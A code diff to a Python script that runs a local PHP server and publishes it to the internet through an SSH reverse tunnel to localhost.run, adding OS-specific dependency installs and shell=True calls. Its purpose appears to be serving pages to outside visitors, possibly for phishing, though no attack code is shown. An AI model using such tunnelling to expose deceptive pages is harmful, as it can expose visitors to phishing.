@@ -5,20 +5,36 @@ import os
 import linecache
 import random
 from time import sleep
-try:
-    from colorama import Fore , init; init()
-    import win32gui, win32con
-    import pandas as pd
-    import keyboard
-    
-except ImportError or ModuleNotFoundError:
-    install = input("unfortunately you dont have excepetd modules !!\nWant to install ? (y/n) : ")
-    if install == "y":
-        os.system("pip install -r requirements.txt")
-        sleep(0.5)
-        pass
-    else:
-        exit(Fore.GREEN + "\nhave a good day".title())
+
+if os.name == "nt":
+    try:
+        from colorama import Fore , init; init()
+        import win32gui, win32con
+        import pandas as pd
+        import keyboard
+        
+    except ImportError or ModuleNotFoundError:
+        install = input("unfortunately you dont have excepetd modules !!\nWant to install ? (y/n) : ")
+        if install == "y":
+            os.system("pip install -r requirements.txt")
+            sleep(0.5)
+            pass
+        else:
+            exit(Fore.GREEN + "\nhave a good day".title())
+else:
+    try:
+        from colorama import Fore , init; init()
+        import pandas as pd
+        import keyboard
+        
+    except ImportError or ModuleNotFoundError:
+        install = input("unfortunately you dont have excepetd modules !!\nWant to install ? (y/n) : ")
+        if install == "y":
+            os.system("pip install -r requirements_linux.txt")
+            sleep(0.5)
+            pass
+        else:
+            exit(Fore.GREEN + "\nhave a good day".title())
 
 #Change Title====================================================================================================
 if os.name == "nt":
@@ -27,14 +43,14 @@ else:
     pass
 #build localhost====================================================================================================
 def php_server():
-    with open("server" , "w") as log:
-        subprocess.Popen((f"php -S localhost:{port}") , stderr=log , stdout=log)
+    with open("Server" , "w") as log:
+        subprocess.Popen((f"php -S localhost:{port}") , stderr=log , stdout=log , shell=True)
 #build host====================================================================================================
 def loaclhost():
     global port
 
-    with open("localhost.txt" , "w") as f:
-        subprocess.Popen((f"ssh -R 80:localhost:{port} nokey@localhost.run"),stderr=f , stdout=f)
+    with open("localhost.txt" , "w") as local:
+        subprocess.Popen((f"ssh -R 80:localhost:{port} nokey@localhost.run"),stderr=local , stdout=local , shell=True)
 #smooth print====================================================================================================
 def Sprint(text):
   for character in text:
@@ -48,14 +64,12 @@ if os.name == "nt":
 else:
     pass
 #check php====================================================================================================
-try:
-    check = subprocess.call("php -v" , stdout=subprocess.DEVNULL)
 
-    if check != 0:
-        print (f"{Fore.RED}[-]{Fore.BLUE} Unfortunately you dont have PHP please install it and come back soon !")
-        sys.exit()
-except FileNotFoundError:
-    pass
+check = subprocess.call("php -v" , stdout=subprocess.DEVNULL , shell=True)
+
+if check != 0:
+    print (f"{Fore.RED}[-]{Fore.BLUE} Unfortunately you dont have PHP please install it and come back soon !")
+    sys.exit()
 
 
 if os.name == "nt":
